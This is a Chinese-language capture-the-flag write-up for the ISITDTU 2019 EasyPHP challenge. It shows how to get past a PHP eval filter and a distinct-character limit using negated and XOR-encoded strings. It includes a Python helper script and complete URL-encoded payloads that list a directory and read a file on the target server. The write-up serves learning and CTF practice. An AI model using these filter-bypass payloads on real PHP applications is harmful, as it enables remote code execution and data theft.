# [ISITDTU 2019]EasyPHP 异或RCE count_chars() 限制长度 通过 构造存在字符获取减小长度

这里有点南啊

首先是一个过滤数字 和一部分字母的eval

肯定是bypass了

这里直接取反phpinfo看看是否可行

```cobol
(~%8F%97%8F%96%91%99%90)();
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/60e5223046aa82171941a383c04bfcb1.png" alt="" style="max-height:536px; box-sizing:content-box;" />


成功执行 这里我们 这里过滤了 system等 使用 prin

```less
print_r(scandir(.))
 
这里 ()._ 4个字符是不可能缺少的 
 
 
printrscandir
 
这里发现重复的是 r n i
 
所以其实我们只需要将 其他p t  s 这些看看能不能获取到 上面3个即可
```

_r来执行

但是这里存在一个内容

```lisp
 
if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');
```

这里我们发现 需要字符不能超过13个 我们首先看看构造

print_r(scandir(.)) 需要多少个

```php
<?php
$_ = $_GET['_'];
echo strlen(count_chars($_,3));
```

这里有个问题

我们之前获取到的取反 其实都是通过 ~ 来获取的 所以这里无法体现

我们将我们的取反进行修改

```cobol
(%8F%8D%96%91%8B%A0%8D)^(%FF%FF%FF%FF%FF%FF%FF)
```

我们使用代码输出看看是不是我们需要的

```php
<?php
    $str = urldecode('%8F%8D%96%91%8B%A0%8D')^urldecode('%FF%FF%FF%FF%FF%FF%FF');
    echo $str;
```

发现确实是 print_r 为什么我们需要这种格式呢 我们下面来看这个形式

```cobol
now = ['.','_','p','r','i','n','t','s','c','a','d','.']
for i in now:
    for j in now:
        if j == i :
            break
        for k in now:
            if k == j:
                break
            for m in now:
                if ord(j)^ord(k)^ord(m) == ord(i):
                    a ="{0}={1}^{2}^{3}".format(i,j,k,m)
                    # a = "{0}={1}^{2}^{3}".format(ord(i),ord(j),ord(k),ord(m))
                    print(a)
```



```cobol
t=n^i^s
s=n^i^t
s=t^i^n
s=t^n^i
c=r^p^a
c=n^i^d
c=s^t^d
a=r^p^c
a=c^p^r
a=c^r^p
d=n^i^c
d=s^t^c
d=c^i^n
d=c^n^i
d=c^t^s
d=c^s^t
```

那我们开始构造

首先print_r

```cobol
(%8F%8D%96%91%8B%A0%8D)^(%FF%FF%FF%FF%FF%FF%FF)
 
print_r
 
这里我们进行构造的选择t
 
(%8F%8D%96%91%91%A0%8D)^(%FF%FF%FF%FF%96%FF%FF)^(%FF%FF%FF%FF%8C%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF)
```

我们看看是不是我们构造的print_r

```php
<?php
    $str = urldecode('%8F%8D%96%91%91%A0%8D')^urldecode('%FF%FF%FF%FF%96%FF%FF')^urldecode('%FF%FF%FF%FF%8C%FF%FF')^urldecode('%FF%FF%FF%FF%FF%FF%FF');
    echo $str;
```

发现确实是这样的

然后我们继续构造scandir

首先确定scandir的值

```cobol
(~%8C%9C%9E%91%9B%96%8D)
=
 
(%8C%9C%9E%91%9B%96%8D)^(%FF%FF%FF%FF%FF%FF%FF)
```

然后开始继续构造

这里我们确定下来 使用 tad 这三个字符

所以我们在scandir 需要构造两个

```cobol
(%8C%9C%8D%91%91%96%8D)^(%FF%FF%8F%FF%96%FF%FF)^(%FF%FF%9c%FF%9C%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF)
```

发现也是ok的

```php
<?php
    $str = urldecode('%8C%9C%8D%91%91%96%8D')^urldecode('%FF%FF%8F%FF%96%FF%FF')^urldecode('%FF%FF%9C%FF%9C%FF%FF')^urldecode('%FF%FF%FF%FF%FF%FF%FF');
    echo $str;
```

然后我们就可以继续测试了

```php
<?php
    $str = urldecode('%D1')^urldecode('%FF');
    echo $str;
 
 
%D1^%FF 构造出. 
 
最后的payload为
```

```cobol
((%8F%8D%96%91%91%A0%8D)^(%FF%FF%FF%FF%96%FF%FF)^(%FF%FF%FF%FF%8C%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(((%8C%9C%8D%91%91%96%8D)^(%FF%FF%8F%FF%96%FF%FF)^(%FF%FF%9c%FF%9C%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))((%D1)^(%FF)));
 
这里记得加括号
 
(print_r((scandir)(.))); 这种
```

然后我们去测试长度



<img src="https://i-blog.csdnimg.cn/blog_migrate/53842e21d10511f945389f8d3c8a2400.png" alt="" style="max-height:85px; box-sizing:content-box;" />


发现就12 我们进入尝试执行看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/f43c94e28792ea40efbf495ae258866d.png" alt="" style="max-height:324px; box-sizing:content-box;" />


然后这里使用 readline(end(scandir(.))) 即可

当然 这里需要重新获取字符串

```cobol
d=e^r^s
l=d^a^i
i=d^a^l
i=l^a^d
i=l^d^a
n=l^a^c
n=i^d^c
s=e^r^d
s=d^r^e
s=d^e^r
c=l^a^n
c=i^d^n
c=n^a^l
c=n^d^i
c=n^l^a
c=n^i^d
```

```cobol
((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));
```

这道题真的 思考时间过久了